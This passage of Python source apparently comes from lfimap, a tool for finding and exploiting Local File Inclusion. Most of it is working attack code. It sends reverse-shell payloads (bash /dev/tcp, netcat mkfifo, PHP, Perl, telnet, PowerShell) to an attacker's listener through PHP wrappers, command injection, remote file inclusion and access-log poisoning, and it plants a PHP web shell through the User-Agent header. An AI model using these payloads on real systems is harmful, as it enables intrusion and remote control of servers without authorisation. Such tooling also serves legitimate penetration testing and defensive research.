        if(rTime > 5.0 and rTime < rTime + (averageTime*20/100) and rTime > rTime - (averageTime*20/100)):
            if(args.postreq): r2, br = POST(url, headers, args.postreq.replace(args.param, encode(test.replace("5", "7"))), proxies, "SQLI", "SQLI")
            else: r2, br = GET(url.replace(args.param, encode(test.replace("5", "7"))), headers, proxies, "SQLI", "SQLI")
            r2Time = r2.elapsed.total_seconds()
            if(r2Time > 7.0 and r2Time < r2Time + (averageTime*20/100) and r2Time > r2Time - (averageTime*20/100)):
                print("[+] SQLI -> " + url.replace(args.param, test))
                print("    Reason: response time is " + str(r.elapsed.total_seconds()) + ", while average being: " + str(averageTime))
                stats["vulns"] += 1
                if(not args.no_stop):
                    return


#Checks if sent payload is executed, if any of the below keywords are in the response, returns True
def checkPayload(webResponse):
    
    for word in KEY_WORDS:
         if(word in webResponse.text):
             if(word == "PD9w" and "PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K" in webResponse.text):
                 return False
             return True
    return False

    
#Prints info about reverse shell attack to stdout
def printInfo(ip, port, shellType, attackMethod):
    print("[i] Sending reverse shell to {0}:{1} using {2} via {3}...".format(ip, port, shellType, attackMethod))

def exploit_bash(exploit, method, ip, port):
    
    url = exploit['GETVAL']
    post = exploit["POSTVAL"]
    
    bashTest = "which%20bash"
    bashPayloadStageOne = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
    bashPayloadStageTwo = "bash+/tmp/1.sh"

    if(method == "INPUT"):
        res, _ = POST(url.replace(tempArg, encode(bashTest)), headers, exploit['POSTVAL'], proxies, "", "", True)
        if("/bash" in res.text):
            u = url.replace(tempArg, encode(bashPayloadStageOne))
            printInfo(ip, port, "bash", "input wrapper")
            POST(u, headers, exploit['POSTVAL'], proxies, "", "", True)
            POST(url.replace(tempArg, encode(bashPayloadStageTwo)), headers, exploit['POSTVAL'], proxies, "", "", True)
            return True
    if(method == "DATA"):
        if(args.postreq): 
            res,_ = POST(url.replace(tempArg, encode(bashTest)), post, headers, proxies, "", "", True)
        else: 
            res, _ = GET(url.replace(tempArg, encode(bashTest)), headers, proxies, "", "", True)
        if("/bash" in res.text):
            printInfo(ip, port, "bash", "data wrapper")
            if(not args.postreq):
                GET(url.replace(tempArg, encode(bashPayloadStageOne)), headers, proxies, "", "", True)
                GET(url.replace(tempArg, encode(bashPayloadStageTwo)), headers, proxies, "", "", True)
            else:
                POST(url.replace(tempArg, encode(bashPayloadStageOne)), headers, post, proxies)
                POST(url.replace(tempArg, encode(bashPayloadStageTwo)), headers, post, proxies, "", "", True)
            return True
    if(method == "EXPECT"):
        if(args.postreq): 
            res,_ = POST(url, headers, post.replace(tempArg, encoded(bashTest)), proxies, "", "", True)
        else: 
            res, _ = GET(url.replace(tempArg, encode(bashTest)), headers, proxies, "", "", True)
        if("/bash" in res.text):
            printInfo(ip, port, "bash", "expect wrapper")
            if(args.postreq):
                POST(url, headers, post.replace(tempArg, encode(bashPayloadStageOne)), proxies, "", "", True)
                POST(url, headers, post.replace(tempArg, encode(bashPayloadStageTwo)), proxies, "", "", True)
            else:
                GET(url.replace(tempArg, encode(bashPayloadStageOne)), headers, proxies, "", "", True)
                GET(url.replace(tempArg, encode(bashPayloadStageTwo)), headers, proxies, "", "", True)
            return True
    if(method == "TRUNC"):
        exploit_log_poison(ip, port, url, bashPayloadStageOne, encode(bashPayloadStageTwo), bashTest, "/bash", exploit['POSTVAL'])
        return True
   
    if(method == "CMD"):
        if(args.postreq): 
            res,_ = POST(url, headers, post.replace(tempArg, encode(bashTest)), proxies, "", "", True)
        else: 
            res,_ = GET(url.replace(tempArg, encode(bashTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/bash" in res.text):
            printInfo(ip, port, "bash", "command injection")
            if(args.postreq):
                POST(url, headers, post.replace(tempArg, encode(bashPayloadStageOne)), proxies, "", "", True)
                POST(url, headers, post.replace(tempArg, encode(bashPayloadStageTwo)), proxies, "", "", True)
            else: 
                GET(url.replace(tempArg, bashPayloadStageOne), headers, proxies, "", "", True)
                GET(url.replace(tempArg, bashPayloadStageTwo), headers, proxies, "", "", True)
            return True

def exploit_nc(exploit, method, ip, port):
    
    url = exploit['GETVAL']
    post = exploit["POSTVAL"]

    ncTest = "which%20nc"
    ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"

    if(method == "INPUT"):
        res, _ = POST(url.replace(tempArg, encode(ncTest)), headers, exploit['POSTVAL'], proxies, "", "", True)
        if("/bin" in res.text and "/nc" in res.text):
            printInfo(ip, port, "nc", "input wrapper")
            POST(url.replace(tempArg, encode(ncPayload)), headers, exploit['POSTVAL'], proxies, "", "", True)
            return True
    if(method == "DATA"):
        if(args.postreq): 
            res, _ = POST(url.replace(tempArg, encode(ncTest)), headers, post, proxies, "", "", True)
        else: 
            res, _ = GET(url.replace(tempArg, encode(ncTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/nc" in res.text):
            printInfo(ip, port, "nc", "data wrapper")
            if(args.postreq): 
                POST(url.replace(tempArg, encode(ncPayload)), post, headers, proxies, "", "", True)
            else: 
                GET(url.replace(tempArg, encode(ncPayload)), headers, proxies, "", "", True)
            return True
    if(method == "EXPECT"):
        if(args.postreq): 
            res, _ = POST(url.replace(tempArg, encode(ncTest)), headers, post, proxies, "", "", True)
        else: 
            res, _ = GET(url.replace(tempArg, encode(ncTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/nc" in res.text):
            printInfo(ip, port, "nc", "expect wrapper")
            if(args.postreq): 
                POST(url.replace(tempArg, encode(ncPayload)), headers, post, proxies, "", "", True)
            else: 
                GET(url.replace(tempArg, encode(ncPayload)), headers, proxie, "", "", True)
            return True
    if(method == "TRUNC"):
        exploit_log_poison(ip, port, url, encode(ncPayload), "", ncTest, "/nc", exploit['POSTVAL'])
        return True
   
    if(method == "CMD"):
        if(args.postreq): 
            res, _ = POST(url, headers, post.replace(tempArg, encode(ncTest)), proxies, "", "", True)
        else:
            res, _ = GET(url.replace(tempArg, encode(ncTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/nc" in res.text):
            printInfo(ip, port, "nc", "command injection")
            if(args.postreq):
                POST(url, headers, post.replace(tempArg, encode(ncPayload)), proxies, "", "", True)
            else: 
                GET(url.replace(tempArg, encode(ncPayload)), headers, proxies, "", "", True)
            return True


def exploit_php(exploit, method, ip, port):

    url = exploit['GETVAL']
    post = exploit['POSTVAL']

    phpTest = "which%20php"
    phpPayload =  "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))

    if(method == "INPUT"):
        u = url.replace(tempArg, encode(phpTest))
        res, _ = POST(u, headers, exploit['POSTVAL'], proxies, "", "", True)
        if("/bin" in res.text and "/php" in res.text):
            printInfo(ip, port, "PHP", "input wrapper")
            POST(url.replace(tempArg, encode(phpPayload)), headers, exploit['POSTVAL'], proxies, "", "", True)
            return True
    if(method == "DATA"):
        if(args.postreq):
            res, _ = POST(url.replace(tempArg, encode(phpTest)), post, headers, proxies, "", "", True)
        else:
            res,_ = GET(url.replace(tempArg, encode(phpTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/php" in res.text):
            printInfo(ip, port, "PHP", "data wrapper")
            if(args.postreq):
                POST(url.replace(tempArg, encode(phpPayload)), post, headers, proxies, "", "", True)
            else:
                GET(url.replace(tempArg, encode(phpPayload)), headers, proxies, "", "", True)
            return True
    if(method == "EXPECT"):
        if(args.postreq): 
            res, _ = POST(url, headers, post.replace(tempArg, encode(phpTest)), proxies, "", "", True)
        else: 
            res,_ = GET(url.replace(tempArg, encode(phpTest)), proxies, "", "", True)
        if("/bin" in res.text and "/php" in res.text):
            printInfo(ip, port, "PHP", "expect wrapper")
            if(args.postreq):
                POST(url, headers, post.replace(tempArg, encode(phpPayload)), proxies, "", "", True)
            else:
                GET(url.replace(tempArg, encode(phpPayload)), headers, proxies, "" , "", True)
            return True
    if(method == "TRUNC"):
        exploit_log_poison(ip, port, url, phpPayload, "", encode(phpTest), "/php", exploit['POSTVAL'])
        return True

    if(method == "CMD"):
        if(args.postreq):
            res, _ = POST(url, headers, post.replace(tempArg, encode(phpTest)), proxies, "", "" , True)
        else:
            res,_ = GET(url.replace(tempArg, encode(phpTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/php" in res.text):
            printInfo(ip, port, "php", "command injection")
            if(args.postreq):
                POST(url, headers, post.replace(tempArg, encode(phpPayload)), proxies, "", "", True)
            else:
                GET(url.replace(tempArg, encode(phpPayload)), headers, proxies, "", "", True)
            return True

def exploit_perl(exploit, method, ip, port):

    url = exploit['GETVAL']
    post = exploit['POSTVAL']
    
    perlTest = "which%20perl"
    perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname"\
                  "(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen"\
                  "(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"

    if(method == "INPUT"): 
        res, _ = POST(url.replace(tempArg, encode(perlTest)), headers, exploit['POSTVAL'], proxies, "", "", True)
        if("/bin" in res.text and "/perl" in res.text):
            u = url.replace(tempArg, encode(perlPayload))
            printInfo(ip, port, "perl", "input wrapper")
            POST(u, headers, exploit['POSTVAL'], proxies, "", "", True)
            return True
    if(method == "DATA"):
        if(args.postreq): 
            res, _ = POST(url.replace(tempArg, encode(perlTest)), headers, post, proxies, "", "", True)
        else: 
            res, _ = GET(url.replace(tempArg, encode(perlTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/perl" in res.text):
            printInfo(ip, port, "perl", "data wrapper")
            if(args.postreq):
                POST(url.replace(tempArg, encode(perlPayload)), headers, post, proxies, "", "", True)
            else: 
                GET(url.replace(tempArg, encode(perlPayload)), headers, proxies, "", "", True)
            return True
    if(method == "EXPECT"):
        if(args.postreq): 
            res, _ = POST(url, headers, post.replace(tempArg, encode(perlPayload)), proxies, "", "", True)
        else: 
            res, _ = GET(url.replace(tempArg, encode(perlTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/perl" in res.text):
            printInfo(ip, port, "perl", "expect wrapper")
            if(args.postreq):
                POST(url, headers, post.replace(tempArg, encode(perlPayload)), proxies, "", "", True)
            else: 
                GET(url.replace(tempArg, encode(perlPayload)), headers, proxies, "", "", True)
            return True
    if(method == "TRUNC"):
        exploit_log_poison(ip, port, url, encode(perlPayload), "", encode(perlTest), "/perl", exploit['POSTVAL'])
        return True

    if(method == "CMD"):
        if(args.postreq):
            res, _ = POST(url, headers, post.replace(tempArg, encode(perlTest)), proxies, "", "", True)
        else: 
            res,_ = GET(url.replace(tempArg, encode(perlTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/perl" in res.text):
            printInfo(ip, port, "perl", "command injection")
            if(args.postreq):
                POST(url, headers, post.replace(tempArg, encode(perlPayload)), proxies, "", "", True)
            else: GET(url.replace(tempArg, encode(perlPayload)), headers, proxies, "", "", True)
            return True

def exploit_telnet(exploit, method, ip, port):

    url = exploit['GETVAL']
    post = exploit['POSTVAL']
    
    telnetTest = "which%20telnet"
    telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, str(port))

    if(method == "INPUT"):
        res, _ = POST(url.replace(tempArg, encode(telnetTest)), headers, exploit['POSTVAL'], proxies, "", "", True)
        if("/bin" in res.text and "/telnet" in res.text):
            u = url.replace(tempArg, encode(telnetPayload))
            printInfo(ip, port, "telnet", "input wrapper")
            POST(u, headers, exploit['POSTVAL'], proxies, "", "", True)
            return True
    if(method == "DATA"):
        if(args.postreq): 
            res, _ = POST(url.replace(tempArg, encode(telnetTest)), headers, post, proxies, "", "", True)
        else:
            res,_ = GET(url.replace(tempArg, encode(telnetTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/telnet" in res.text):
            u = url.replace(tempArg, encode(telnetPayload))
            printInfo(ip, port, "telnet", "data wrapper")
            if(args.postreq):
                POST(url.replace(tempArg, encode(telnetPayload)), headers, post, proxies, "", "", True)
            else:
                GET(u, headers, proxies, "", "", True)
            return True
    if(method == "EXPECT"):
        if(args.postreq):
            res, _ = POST(url, headers, post.replace(tempArg, encode(telnetPayload)), proxies, "", "", True)
        else:
            res, _ = GET(url.replace(tempArg, encode(telnetTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/telnet" in res.text):
            u = url.replace(tempArg, encode(telnetPayload))
            printInfo(ip, port, "telnet", "expect wrapper")
            if(args.postreq):
                POST(url, headers, post.replace(tempArg, encode(telnetPayload)), proxies, "", "", True)
            else:
                GET(u, headers, proxies, "", "", True)
            return True
    if(method == "TRUNC"):
        exploit_log_poison(ip, port, url, encode(telnetPayload), "", encode(telnetTest), "/telnet", exploit['POSTVAL'])
        return True

    if(method == "CMD"):
        if(args.postreq): 
            res, _ = POST(url, headers, post.replace(tempArg, encode(telnetTest)), proxies, "", "", True)
        else:
            res, _ = GET(url.replace(tempArg, encode(telnetTest)), headers, proxies, "", "", True)
        if("/bin" in res.text and "/telnet" in res.text):
            printInfo(ip, port, "telnet", "command injection")
            if(args.postreq):
                POST(url, headers, post.replace(tempArg, encode(telnetPayload)), proxies, "", "", True)
            else:
                GET(url.replace(tempArg, encode(telnetPayload)), headers, proxies, "", "", True)
            return True

def exploit_powershell(exploit, method, ip, port):

    url = exploit['GETVAL']
    post = exploit['POSTVAL']

    powershellTest = "powershell.exe%20ipconfig"
    powershellPayload =  "powershell+-nop+-c+\"$client+%3d+New-Object+System.Net.Sockets.TCPClient('{IP}',{PORT})%3b$stream+%3d+$client."\
                         "GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data"\
                         "+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$"\
                         "sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream"\
                         ".Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\" "
    
    powershellPayload = powershellPayload.replace("{IP}", ip)
    powershellPayload = powershellPayload.replace("{PORT}", str(port))
    
    if(method == "INPUT"):
        res, _ = POST(url.replace(tempArg, encode(powershellTest)), headers, exploit['POSTVAL'], proxies, "", "", True)
        if("Windows IP Configuration" in res.text):
            u = url.replace(tempArg, encode(powershellPayload))
            POST(u, headers, exploit['POSTVAL'], proxies, "", "", True)
            printInfo(ip, port, "powershell", "input wrapper")
            return True
    if(method == "DATA"):
        if(args.postreq):
            res, _ = POST(url.replace(tempArg, encode(powershellTest)), headers, post, proxies, "", "", True)
        else: 
            res,_ = GET(url.replace(tempArg, encode(powershellTest)), headers, proxies, "", "", True)
        if("Windows IP Configuration" in res.text):
            printInfo(ip, port, "powershell", "data wrapper")
            u = url.replace(tempArg, encode(powershellPayload))
            if(args.postreq): 
                POST(url.replace(tempArg, encode(powershellTest)), headers, post, proxies, "", "", True)
            else: 
                GET(u, headers, proxies, "", "", True)
            return True
    if(method == "EXPECT"):
            if(args.postreq):
                res, _ = POST(url, headers, post.replace(tempArg, encode(powershellTest)), proxies, "", "", True)
            else:
                res, _ = GET(url.replace(tempArg, encode(powershellTest)), headers, proxies, "", "", True)
            if("Windows IP Configuration" in res.text):
                u = url.replace(tempArg, encode(powershellPayload))
                printInfo(ip, port, "powershell", "expect wrapper")
                if(args.postreq):
                    POST(url, headers, post.replace(tempArg,  encode(powershellTest)), proxies, "", "", True)
                else: 
                    GET(u, headers, proxies, "", "", True)
                return True
    if(method == "TRUNC"):
        exploit_log_poison(ip, port, url, encode(powershellPayload), "", encode(powershellTest), "Windows IP Configuration", exploit['POSTVAL'])
        return True

    if(method == "CMD"):
        if(args.postreq):
            res, _ = POST(url, headers, post.replace(tempArg, encode(powershellTest)), proxies, "", "", True)
        else: 
            res, _ = GET(url.replace(tempArg, encode(powershellTest)), headers, proxies, "", "", True)
        if("Windows IP Configuration" in res.text):
            printInfo(ip, port, "powershell", "command injection")
            if(args.postreq):
                POST(url, headers, post.replace(tempArg, encode(powershellPayload)), proxies, "", "", True)
            else:
                GET(url.replace(tempArg, encode(powershellPayload)), headers, proxies, "", "", True)
            return True

def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
    #Copy a file from exploits/reverse_shell.php
    if(not os.path.exists(payloadFile)):
        print("[-] Cannot find " + payloadFile + ". Skipping RFI exploit...")
        return
    else:
        #Prepare file that will be included
        with open(payloadFile, "r") as f:
            with open(temporaryFile, "w") as r:
                lines = f.readlines()
                for line in lines:
                    line = line[:-1]
                    r.write(line + "\n")
    
    #Modify reverse_shell_temp.php ip and port number values
    with(fileinput.FileInput(temporaryFile, inplace = True)) as file:
        for line in file:
            #This redirects stdout to a file, replacing the ip and port values as needed
            print(line.replace("IP_ADDRESS", ip))
    with(fileinput.FileInput(temporaryFile, inplace = True)) as file:
        for line in file:
            print(line.replace("PORT_NUMBER", str(port)))

def exploit_rfi(exploit, method, ip, port):
    if(args.f):
        return

    url = exploit['GETVAL']
    printInfo(ip, port, "php", "Remote File Inclusion")
    
    if(not args.postreq):
        if(exploit['OS'] == "windows"):
            GET(url.replace(tempArg, "reverse_shell_win_tmp.php"), headers, proxies, "", "", True)
            prepareRfiExploit(scriptDirectory + os.sep + "exploits/reverse_shell_win.php", webDir + os.path.sep + "reverse_shell_win_tmp.php", ip, port)
        else:
            GET(url.replace(tempArg, "reverse_shell_lin_tmp.php"), headers, proxies, "", "", True)
            prepareRfiExploit(scriptDirectory + os.sep + "exploits/reverse_shell_lin.php", webDir + os.path.sep + "reverse_shell_lin_tmp.php", ip, port)
    else:
        if(exploit['OS'] == "linux"):
            POST(url, headers, exploit['POSTVAL'].replace(tempArg, "reverse_shell_lin_tmp.php"), proxies, "", "", True)
            prepareRfiExploit(scriptDirectory + os.sep + "exploits/reverse_shell_lin.php", webDir + os.path.sep + "reverse_shell_lin_tmp.php", ip, port)
        else:
            POST(url, headers, exploit['POSTVAL'].replace(tempArg, "reverse_shell_win_tmp.php"), proxies, "", "", True)
            prepareRfiExploit(scriptDirectory + os.sep + "exploits/reverse_shell_win.php", webDir + os.path.sep + "reverse_shell_win_tmp.php", ip, port) 
    return


def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString, post):
    if(args.f):
        return

    if(args.verbose):
        print("[i] Trying to locate http access log file...")

    maliciousHeaders = headers.copy()
    maliciousHeaders['User-Agent'] = "<?php system($_GET['c']); ?>"
    
    with open("wordlists/http_access_log.txt", "r") as f:
        lines = f.readlines()
        for line in lines:
            line = line.replace("\n", "")
            u = url.replace(tempArg, line)
            
            if(args.postreq): 
                res, _ = POST(url, headers, post.replace(tempArg, line), proxies, "", "", True)
            else: 
                res, _ = GET(u, headers, proxies, "", "", True)

            if(headers['User-Agent'] in res.text):
                #Upload web shell inside log
                res, _ = GET(u, maliciousHeaders, proxies, "", "", True)

                exploitUrl = u + "&c=" + testPayload
                res, _ = GET(exploitUrl, headers, proxies, "", "", True)
                if(testString in res.text):
                    printInfo(ip, port, "bash", "access log posioning")
                      
                    if(args.postreq):
                        #Stage 1
                        exploitPost = post + "&c=" + payloadStageOne
                        POST(url, headers, exploitPost, proxies, "", "", True)

                        if(payloadStageTwo != ""):
                            #Stage 2
                            POST(url, exploitPost, headers, proxies, "", "", True)
                            exploitPost = u + "&c=" + payloadStageTwo
                        return True
                    
                    else:
                        #Stage 1
                        exploitUrl = u+ "&c=" + payloadStageOne
                        GET(exploitUrl, headers, proxies, "", "", True)
                        
                        if(payloadStageTwo != ""):
                            #Stage 2
                            exploitUrl = u+ "&c=" + payloadStageTwo
                            GET(exploitUrl, headers, proxies, "", "", True)
                        return True

def pwn(exploit):
    
    ip = args.lhost
    port = args.lport
    
    method = exploit['ATTACK_METHOD']

    if(method == "INPUT"):
        if(exploit['OS'] == "linux"):
            if(exploit_bash(exploit, "INPUT", ip, port)): return
            if(exploit_nc(exploit, "INPUT", ip, port)): return
            if(exploit_php(exploit, "INPUT", ip, port)): return
            if(exploit_perl(exploit, "INPUT", ip, port)): return
            if(exploit_telnet(exploit, "INPUT", ip, port)): return
        else:
            if(exploit_powershell(exploit, "INPUT", ip, port)): return   

    elif(method == "DATA"):
        if(exploit['OS'] == "linux"):
            if(exploit_bash(exploit, "DATA", ip, port)): return
            if(exploit_nc(exploit, "DATA", ip, port)): return
            if(exploit_php(exploit, "DATA", ip, port)): return
            if(exploit_perl(exploit, "DATA", ip, port)): return
            if(exploit_telnet(exploit, "DATA", ip, port)): return
        else:
            if(exploit_powershell(exploit, "DATA", ip, port)): return

    elif(method == "EXPECT"):
        if(exploit['OS'] == "linux"):
            if(exploit_bash(exploit, "EXPECT", ip, port)): return
            if(exploit_nc(exploit, "EXPECT", ip, port)): return
            if(exploit_php(exploit, "EXPECT", ip, port)): return
            if(exploit_perl(exploit, "EXPECT", ip, port)): return
            if(exploit_telnet(exploit, "EXPECT", ip, port)): return
        else:
            if(exploit_powershell(exploit, "EXPECT", ip, port)): return 

    elif(method == "RFI"):
        if(exploit_rfi(exploit, "RFI", ip, port)): return
    
    elif(method == "TRUNC"):
        if(exploit['OS'] == "linux"):
            if(exploit_bash(exploit, "TRUNC", ip, port)): return
            if(exploit_nc(exploit, "TRUNC", ip, port)): return
            if(exploit_php(exploit, "TRUNC", ip, port)): return
            if(exploit_perl(exploit, "TRUNC", ip, port)): return
            if(exploit_telnet(exploit, "TRUNC", ip, port)): return
        else:
            if(exploit_powershell(exploit, "TRUNC", ip, port)): return
    
    elif(method == "CMD"):
        if(exploit['OS'] == "linux"):
            if(exploit_bash(exploit, "CMD", ip, port)): return
            if(exploit_nc(exploit, "CMD", ip, port)): return
            if(exploit_php(exploit, "CMD", ip, port)): return
            if(exploit_perl(exploit, "CMD", ip, port)): return
            if(exploit_telnet(exploit, "CMD", ip, port)): return
        else:
            if(exploit_powershell(exploit, "CMD", ip, port)): return


#Cleans up all created files during testing
def lfimap_cleanup():
    if(os.path.exists(webDir + os.path.sep + "reverse_shell_lin_tmp.php")):
        os.remove(webDir + os.path.sep + "reverse_shell_lin_tmp.php")
    if(os.path.exists(webDir + os.path.sep + "reverse_shell_win_tmp.php")):
        os.remove(webDir + os.path.sep + "reverse_shell_win_tmp.php")
    
    # Print stats
    print("\n" + '-'*40 + "\nLfimap finished with execution.")
    print("Endpoints tested: " + str(stats["urls"]))

    totalRequests = stats["headRequests"] + stats["getRequests"] + stats["postRequests"]
    print("Requests sent: " + str(totalRequests))
    
    if(stats["info"] > 0):
        print("Generic security issues found: " + str(stats["info"]))

    print("Vulnerabilities found: " + str(stats["vulns"]))
    
    #Exit
    os._exit(0)

def main():
    global exploits
    global proxies

    proxies['http'] = args.proxyAddr
    proxies['https'] = args.proxyAddr

    # If multiple URLS are specified from a file.
    if(args.f):
        c = 0
        with open(args.f, "r") as fl:
            lines = fl.read().splitlines()
            
            # To remove duplicates
            wordlistSet = set()
            for line in lines:
                if(args.param not in line):
                    continue

                wordlistSet.add(line.replace("\n", ""))

            for line in wordlistSet:
                print("\n[ii] Testing URL: " + str(line))
                #Perform all tests
                
                if("http" not in line):
                    if(args.verbose):
                        print("[i] No scheme provided in url '" + line + "'. Defaulting to http://")
                    line = "http://" + line
                
                #Check if URL line is accessible
                try:
                    if(args.postreq):
                        r,_ = POST(line, headers, proxies, "test", "test")
                    else:
                        r,_ = GET(line, headers, proxies, "test", "test")
                    
                    okCode = False
                    if(args.http_valid):
                        for http_code in args.http_valid:
                            if(http_code == r.status_code):
                                okCode = True
                        
                        if(not okCode):
                            print("[-] " + line + " is not accessible. Specified valid status code != " + str(r.status_code) + ". Skipping...")
                            print("[i] Try specifying parameter --http-ok " + str(r.status_code) + "\n")
                            continue
                    
                    else:
                        if(r.status_code == 404):
                            print("[-] " + line + " is not accessible. HTTP status code " + str(r.status_code) + ". Skipping...")
                            print("[i] Try specifying parameter --http-ok " + str(r.status_code) + "\n")
                            continue
                    
                    if("Location" in r.headers):
                        if(r.headers["Location"] == args.param):
                            print("[+] Open redirection -> " + line.replace("FUZZ", "https://google.com"))
                            stats["vulns"] += 1
                            continue
                
                except ConnectionRefusedError:
                    print("[-] Failed to establish connection to " + args.url)
                except requests.exceptions.ConnectTimeout:
                    print("[-] Url '" + line + "' timed out. Skipping...")
                    continue
                except urllib3.exceptions.NewConnectionError:
                    print("[-] Failed to establish connection to " + line)
                    continue
                except OSError:
                    print("[-] Failed to establish connection to " + line)
                    continue
                except KeyboardInterrupt:
                    print("\nKeyboard interrupt detected. Exiting...")
                    lfimap_cleanup()
                except:
                    raise

                stats["urls"] += 1
                default = True
                if(args.test_all):
                    test_heuristics(line)
                    test_filter(line)
                    test_input(line)
                    test_data(line)
                    test_expect(line)
                    test_rfi(line)
                    test_file_trunc(line)
                    test_trunc(line)
                    test_cmd_injection(line)
                    test_sqli(line)
                    test_xss(line)
                    default = False        
                    continue

                if(args.heuristics):
                    default = False
                    test_heuristics(line)
                if(args.php_filter):
                    default = False
                    test_filter(line)
                if(args.php_input):
                    default = False
                    test_input(line)
                if(args.php_data):
                    default = False
                    test_data(line)
                if(args.php_expect):
                    default = False
                    test_expect(line)
                if(args.rfi):
                    default = False
                    test_rfi(line)
                if(args.file):
                    default = False
                    test_file_trunc(line)
                if(args.trunc):
                    default = False
                    test_trunc(line)
                if(args.cmd):
                    default=False
                    test_cmd_injection(line)
                if(args.sqli):
                    default = False
                    test_sqli(line)
                if(args.xss):
                    default = False
                    test_xss(line)
            
                #Default behaviour
                if(default):
                    test_filter(line)
                    test_input(line)
                    test_data(line)
                    test_expect(line)
                    test_rfi(line)
                    test_file_trunc(line)
                    test_trunc(line)
                
            c += 1
            if(c == len(lines)):
                lfimap_cleanup()

        lfimap_cleanup()

    # If single URL is specified
    else:
        if("http" not in args.url):
            if(args.verbose):
                print("No scheme provided in '" + url + "'. Defaulting to http://")
            args.url = "http://" + args.url
        
       
        try:     
            #Check if url is accessible
            if(args.postreq):
                r,_ = POST(args.url, headers, args.postreq, proxies, "test", "test")
            else:
                r,_ = GET(args.url, headers, proxies, "test", "test")
           
            okCode = False
            if(args.http_valid):
                for http_code in args.http_valid:
                    if(http_code == r.status_code):
                        okCode = True

                if(not okCode):
                    print("[-] " + args.url + " is not accessible. HTTP code " + str(r.status_code) + ".")
                    print("[i] Try specifying parameter --http-ok " + str(r.status_code) + "\n")
                    sys.exit(-1)

            else:
                if(r.status_code == 404):
                    print("[-] " + args.url + " is not accessible. HTTP code " + str(r.status_code) + ". Exiting...")
                    print("[i] Try specifying parameter --http-ok " + str(r.status_code) + "\n")
                    sys.exit(-1)
            
            if("Location" in r.headers):
                if(r.headers["Location"] == args.param):
                    print("[+] Open redirection -> " + args.url.replace("FUZZ", "https://google.com"))
                    stats["vulns"] += 1
                    lfimap_cleanup()

            stats["urls"] += 1
            url = args.url
            #Perform all tests
            if(args.test_all):
                test_heuristics(url)
                test_filter(url)
                test_input(url)
                test_data(url)
                test_expect(url)
                test_rfi(url)
                test_file_trunc(url)
                test_trunc(url)
                test_cmd_injection(url)
                test_sqli(url)
                test_xss(url)
                    
                lfimap_cleanup()
                
            default = True
    
            if(args.heuristics):
                default = False
                test_heuristics(url)
            if(args.php_filter):
                default = False
                test_filter(url)
            if(args.php_input):
                default = False
                test_input(url)
            if(args.php_data):
                default = False
                test_data(url)
            if(args.php_expect):
                default = False
                test_expect(url)
            if(args.rfi):
                default = False
                test_rfi(url)
            if(args.file):
                default = False
                test_file_trunc(url)
            if(args.trunc):
                default = False
                test_trunc(url)
            if(args.cmd):
                default=False
                test_cmd_injection(url)
            if(args.sqli):
                default = False
                test_sqli(url)
            if(args.xss):
                default = False
                test_xss(url)
    
            #Default behaviour
            if(default):
                test_filter(url)
                test_input(url)
                test_data(url)
                test_expect(url)
                test_rfi(url)
                test_file_trunc(url)
                test_trunc(url)
        
        except requests.exceptions.ConnectTimeout:
            raise
            print("[-] Url '" + args.url + "' timed out. Skipping...")
        except ConnectionRefusedError:
            raise
            print("[-] Failed to establish connection to " + args.url)
        except urllib3.exceptions.NewConnectionError:
            raise
            print("[-] Failed to establish connection to " + args.url)
        except OSError:
            raise
            print("[-] Failed to establish connection to " + args.url)
        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected. Exiting...")
            lfimap_cleanup()
        except:
            raise

        lfimap_cleanup()


if(__name__ == "__main__"):
    
    
    print("")
    parser = argparse.ArgumentParser(description="lfimap, Local File Inclusion discovery and exploitation tool", formatter_class=RawTextHelpFormatter, add_help=False)
    
    mandatoryGroup = parser.add_argument_group("MANDATORY")
    mandatoryGroup.add_argument('-U', type=str,nargs="?", metavar="url", dest="url", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=PWN" """)
    mandatoryGroup.add_argument('-F', type=str, nargs="?", metavar="urlfile", dest="f", help="\t\t Specify url wordlist (every line should have --param|'PWN'.)")

    optionsGroup = parser.add_argument_group('GENERAL OPTIONS')
    optionsGroup.add_argument('-C', type=str, metavar='<cookie>', dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
